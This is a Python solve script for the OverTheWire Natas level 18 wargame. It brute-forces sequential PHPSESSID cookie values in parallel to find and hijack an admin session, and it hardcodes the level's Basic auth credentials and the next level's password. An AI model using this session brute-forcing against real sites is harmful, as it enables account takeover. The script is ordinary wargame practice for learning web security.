#!/usr/bin/env python3
import re
import requests
import concurrent.futures
x = 1
url = "http://natas18.natas.labs.overthewire.org/index.php"
pattern = re.compile(r'regular user')


def make_request(x):
    global url
    global pattern
    headers = {
        "Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==",
        "Cookie": f"PHPSESSID={x}"
    }
    response = requests.get(url, headers=headers)
    response = pattern.findall(response.text)
    if(len(response) < 1):
        return ["[*] Got the admin dude! itz =>", x]
        exit("[*] Yo bruh B)")
    return [response[0], x]


map_list = [i for i in range(641)]
with concurrent.futures.ProcessPoolExecutor() as executor:
    results = executor.map(make_request, map_list)
    for result in results:
        print(result[0], result[1])


"""Password for the next level got 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs """
